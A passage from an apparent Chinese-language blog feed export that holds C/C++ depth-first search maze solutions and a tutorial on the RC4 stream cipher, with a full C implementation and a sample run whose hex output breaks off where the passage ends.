class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(<span class="type">int</span> s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(找到解了)</span><br><span class="line">&#123;</span><br><span class="line">相应的操作；</span><br><span class="line"><span class="keyword">return</span> ；</span><br><span class="line">&#125;</span><br><span class="line">尝试每一种可能</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(满足条件)</span><br><span class="line">&#123;</span><br><span class="line">标记走过；</span><br><span class="line">进行下一步dfs；</span><br><span class="line">回溯一步；<span class="comment">//恢复原状态</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><ol><li><h3 id="最短路径（迷宫问题）"><a href="#最短路径（迷宫问题）" class="headerlink" title="最短路径（迷宫问题）"></a>最短路径（迷宫问题）</h3></li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//用dfs来计算最短路径</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> r,c,num=<span class="number">10000</span>;</span><br><span class="line"><span class="type">char</span> map[<span class="number">41</span>][<span class="number">41</span>];</span><br><span class="line"><span class="type">int</span> dx[]=&#123;<span class="number">1</span>,<span class="number">-1</span>,<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">int</span> dy[]=&#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">-1</span>&#125;;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> y,<span class="type">int</span> k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(x==r&amp;&amp;y==c)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(num&gt;k)</span><br><span class="line">&#123;</span><br><span class="line">num=k;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> nx=x+dx[i];</span><br><span class="line"><span class="type">int</span> ny=y+dy[i];</span><br><span class="line"><span class="keyword">if</span>(nx&gt;=<span class="number">1</span>&amp;&amp;nx&lt;=c&amp;&amp;ny&gt;=<span class="number">1</span>&amp;&amp;ny&lt;=r&amp;&amp;map[ny][nx]==<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">map[ny][nx]=<span class="string">&#x27;#&#x27;</span>;</span><br><span class="line"><span class="built_in">dfs</span>(nx,ny,k+<span class="number">1</span>);</span><br><span class="line">map[ny][nx]=<span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;r,&amp;c);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=r;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=c;j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot; %c&quot;</span>,&amp;map[i][j]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">map[<span class="number">1</span>][<span class="number">1</span>]=<span class="string">&#x27;#&#x27;</span>;</span><br><span class="line"><span class="built_in">dfs</span>(<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,num);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2-路径判断"><a href="#2-路径判断" class="headerlink" title="2. 路径判断"></a>2. 路径判断</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//dfs遍历是否能够从(ha,la)到(hb,lb)</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> dx[]=&#123;<span class="number">1</span>,<span class="number">-1</span>,<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">int</span> dy[]=&#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">-1</span>&#125;;</span><br><span class="line"><span class="type">int</span> n,ha,la,hb,lb,nx,ny;</span><br><span class="line"><span class="type">bool</span> flag;</span><br><span class="line"><span class="type">char</span> map[<span class="number">200</span>][<span class="number">200</span>];</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">nx=x+dx[i];</span><br><span class="line">ny=y+dy[i];</span><br><span class="line"><span class="keyword">if</span>(nx&gt;=<span class="number">0</span>&amp;&amp;nx&lt;n&amp;&amp;ny&gt;=<span class="number">0</span>&amp;&amp;ny&lt;n&amp;&amp;map[nx][ny]==<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">map[nx][ny]=<span class="string">&#x27;#&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(nx==hb&amp;&amp;ny==lb)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;YES\n&quot;</span>);</span><br><span class="line">flag=<span class="literal">true</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">dfs</span>(nx,ny);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> k;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;k);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;k;i++)</span><br><span class="line">&#123;</span><br><span class="line">flag=<span class="literal">false</span>;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line"><span class="built_in">memset</span>(map,<span class="string">&#x27;#&#x27;</span>,<span class="built_in">sizeof</span>(map));</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;n;j++)</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> h=<span class="number">0</span>;h&lt;n;h++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot; %c&quot;</span>,&amp;map[j][h]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d%d&quot;</span>,&amp;ha,&amp;la,&amp;hb,&amp;lb);</span><br><span class="line"><span class="keyword">if</span>(map[ha][la]==<span class="string">&#x27;#&#x27;</span>||map[hb][lb]==<span class="string">&#x27;#&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;NO\n&quot;</span>);</span><br><span class="line"><span class="keyword">continue</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">map[ha][la]=<span class="string">&#x27;#&#x27;</span>;</span><br><span class="line"><span class="comment">//标记起点走过</span></span><br><span class="line"><span class="built_in">dfs</span>(ha,la);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!flag)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;NO\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Algorithms </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>RC4</title>
      <link href="/2023/04/01/RC4/"/>
      <url>/2023/04/01/RC4/</url>
      
        <content type="html"><![CDATA[<h1 id="RC4"><a href="#RC4" class="headerlink" title="RC4"></a>RC4</h1><h2 id="什么是RC4"><a href="#什么是RC4" class="headerlink" title="什么是RC4 ?"></a>什么是RC4 ?</h2><p> RC4加密算法是大名鼎鼎的RSA三人组中的头号人物Ron Rivest在1987年设计的密钥长度可变的流加密算法簇，之所以称其为簇，是由于其核心部分的S-box长度可为任意，但一般为256字节。</p><p> 在密码学中，RC4（来自Rivest Cipher 4的缩写）是一种流加密算法，密钥长度可变。它加解密使用相同的密钥，因此也属于对称加密算法。所谓对称加密，就是加密和解密的过程是一样的。RC4是有线等效加密（WEP）中采用的加密算法，也曾经是TLS可采用的算法之一。</p><p> RC4已经成为一些常用的协议和标准的一部分，如1997年的WEP和2003&#x2F;2004年无线卡的WPA; 和1995年的SSL，以及后来1999年的TLS。让它如此广泛分布和使用的主要因素是它不可思议的简单和速度，不管是软件还是硬件，实现起来都十分容易。</p><h2 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h2><p>对明文使用同一个密钥异或两次最后得到的是原文</p><ul><li>加密：原文和Keystream进行异或得到密文</li><li>解密：密文和Keystream进行异或得到原文</li></ul><p><img src="/.io//1344097-20210115113816217-826912812.png" alt="img"></p><h2 id="流程图解"><a href="#流程图解" class="headerlink" title="流程图解"></a>流程图解</h2><p><img src="/.io//1344097-20210115113902945-1226971045.png" alt="img"></p><h2 id="生成秘钥流（KeyStream）"><a href="#生成秘钥流（KeyStream）" class="headerlink" title="生成秘钥流（KeyStream）"></a>生成秘钥流（KeyStream）</h2><p>从上图可以看出来，RC4加密原理很简单，只需要一个KeyStream与明文进行异或即可，密钥流的长度和明文的长度是对应的。RC4算法的的主要代码还是在于如何生成秘钥流。</p><p>密钥流的生成由两部分组成：</p><ol><li>KSA（the Key-Scheduling Algorithm)</li><li>PRGA(the Pseudo-Random Generation Algorithm)</li></ol><h3 id="利用Key生成S盒——The-key-scheduling-algorithm-KSA"><a href="#利用Key生成S盒——The-key-scheduling-algorithm-KSA" class="headerlink" title="利用Key生成S盒——The key-scheduling algorithm (KSA)"></a>利用Key生成S盒——The key-scheduling algorithm (KSA)</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 得到S-box */</span></span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">    S[i] = i;</span><br><span class="line">    T[i] = puc_key[i % key_length];</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">    j = (j + S[i] + T[i]) % <span class="number">256</span>;</span><br><span class="line">    swap_uchar(&amp;S[i], &amp;S[j]); <span class="comment">//交换S[i]和S[j]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="利用S盒生成密钥流——The-pseudo-random-generation-algorithm-PRGA"><a href="#利用S盒生成密钥流——The-pseudo-random-generation-algorithm-PRGA" class="headerlink" title="利用S盒生成密钥流——The pseudo-random generation algorithm(PRGA)"></a>利用S盒生成密钥流——The pseudo-random generation algorithm(PRGA)</h3><p><img src="/.io//1344097-20210115114116132-568699983.png" alt="img"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 生成密钥流 Keystream */</span></span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> t = <span class="number">0</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> k = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; ul_data_length; k++) &#123;</span><br><span class="line">    i = (i + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">    j = (j + puc_sbox[i]) % <span class="number">256</span>;</span><br><span class="line">    swap_uchar(&amp;puc_sbox[i], &amp;puc_sbox[j]);</span><br><span class="line">    t = (puc_sbox[i] + puc_sbox[j]) % <span class="number">256</span>;</span><br><span class="line">    puc_key_stream[k] = puc_sbox[t];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SBOX_LEN 256</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> rc4_encrypt rc4_crypt</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> rc4_decrypt rc4_crypt</span></span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">swap_uchar</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *puc_x, <span class="type">unsigned</span> <span class="type">char</span> *puc_y)</span></span><br><span class="line">&#123;</span><br><span class="line">    *puc_x = *puc_x ^ *puc_y;</span><br><span class="line">    *puc_y = *puc_x ^ *puc_y;</span><br><span class="line">    *puc_x = *puc_x ^ *puc_y;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">hexdump</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *puc_data, <span class="type">int</span> length)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X&quot;</span>, puc_data[i]);</span><br><span class="line">        <span class="keyword">if</span> (i &amp;&amp; (i + <span class="number">1</span>) % <span class="number">16</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 利用Key生成S盒</span></span><br><span class="line"><span class="comment"> * the Key-Scheduling Algorithm</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">rc4_ksa</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *puc_sbox, <span class="type">unsigned</span> <span class="type">char</span> *puc_key, <span class="type">int</span> key_length)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> tmp[SBOX_LEN] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; SBOX_LEN; i++) &#123;</span><br><span class="line">        puc_sbox[i] = i;</span><br><span class="line">        tmp[i] = puc_key[i % key_length];</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; SBOX_LEN; i++) &#123;</span><br><span class="line">        j = (j + puc_sbox[i] + tmp[i]) % SBOX_LEN;</span><br><span class="line">        swap_uchar(&amp;puc_sbox[i], &amp;puc_sbox[j]); <span class="comment">//交换puc_sbox[i]和puc_sbox[j]</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 利用S盒生成密钥流</span></span><br><span class="line"><span class="comment"> * The pseudo-random generation algorithm(PRGA)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">rc4_prga</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *puc_sbox, <span class="type">unsigned</span> <span class="type">char</span> *puc_key_stream, <span class="type">unsigned</span> <span class="type">long</span> ul_data_length)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> t = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> k = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; ul_data_length; k++) &#123;</span><br><span class="line">        i = (i + <span class="number">1</span>) % SBOX_LEN;</span><br><span class="line">        j = (j + puc_sbox[i]) % SBOX_LEN;</span><br><span class="line">        swap_uchar(&amp;puc_sbox[i], &amp;puc_sbox[j]);</span><br><span class="line">        t = (puc_sbox[i] + puc_sbox[j]) % SBOX_LEN;</span><br><span class="line">        <span class="comment">/* 为了更清晰理解rc4算法流程，此处保存keystream，不直接进行XOR运算 */</span></span><br><span class="line">        puc_key_stream[k] = puc_sbox[t];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/* 加解密 */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">rc4_crypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *puc_data, <span class="type">unsigned</span> <span class="type">char</span> *puc_key_stream, <span class="type">unsigned</span> <span class="type">long</span> ul_data_length)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> i = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* 把PRGA算法放在加解密函数中可以不需要保存keystream */</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; ul_data_length; i++) &#123;</span><br><span class="line">        puc_data[i] ^= puc_key_stream[i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> sbox[SBOX_LEN] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">char</span> key[SBOX_LEN] = &#123;<span class="string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span>&#125;; <span class="comment">//秘钥内容随便定义</span></span><br><span class="line">    <span class="type">char</span> data[<span class="number">512</span>] = <span class="string">&quot;lsRJ@.0 lvfvr#9527&quot;</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> puc_keystream[<span class="number">512</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> ul_data_length = <span class="built_in">strlen</span>(data);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;key=%s, length=%d\n\n&quot;</span>, key, <span class="built_in">strlen</span>(key));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Raw data string:%s\n&quot;</span>, data);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Raw data hex:\n&quot;</span>);</span><br><span class="line">    hexdump(data, ul_data_length);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* 生成S-box */</span></span><br><span class="line">    rc4_ksa(sbox, (<span class="type">unsigned</span> <span class="type">char</span> *)key, <span class="built_in">strlen</span>(key));</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* 生成keystream并保存,S-box也会被更改 */</span></span><br><span class="line">    rc4_prga(sbox, puc_keystream, ul_data_length);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;S-box final status:\n&quot;</span>);</span><br><span class="line">    hexdump(sbox, <span class="keyword">sizeof</span>(sbox));</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;key stream:\n&quot;</span>);</span><br><span class="line">    hexdump(puc_keystream, ul_data_length);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* 加密 */</span></span><br><span class="line">    rc4_encrypt((<span class="type">unsigned</span> <span class="type">char</span>*)data, puc_keystream, ul_data_length);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;cipher hexdump:\n&quot;</span>);</span><br><span class="line">    hexdump(data, ul_data_length);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* 解密 */</span></span><br><span class="line">    rc4_decrypt((<span class="type">unsigned</span> <span class="type">char</span>*)data, puc_keystream, ul_data_length);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;decypt data:%s\n&quot;</span>, data);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行示例：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">┌──(shelmean㉿ubuntu)-[~/rc4]</span><br><span class="line">└─$ ./rc4</span><br><span class="line">key=abcdefghijklmnopqrstuvwxyz, length=26</span><br><span class="line"> </span><br><span class="line">Raw data string:lsRJ@.0 lvfvr#9527</span><br><span class="line">Raw data hex:</span><br><span class="line">6C73524A402E30206C76667672233935</span><br><span class="line">3237</span><br><span class="line">S-box final status:</span><br><span class="line">0F6F831DDB7F1C9C918760EB3B2FF7B3</span><br><span class="line">3F49485A942603DEA95F463386711A55</span><br><span class="line">DC6DF03D05975EAA41D94E2DAF135059</span><br><span class="line">09ED42C69847067BCCB75BD7747D0C4D</span><br><span class="line">2B0E844F9A516853527311354C77219E</span><br><span class="line">FD179F02297C18A06A7572BF2CC5A108</span><br><span class="line">E1F8E7A819C0DFA28DFF8FD262D4BAAD</span><br><span class="line">6E3CA34476340B048CA580E5F4B42A20</span><br><span class="line">2232FA153090EECB9B56A600EFB2A7A4</span><br><span class="line">2EF5C1E3AEF93882B0B6B87E376C668E</span><br><span 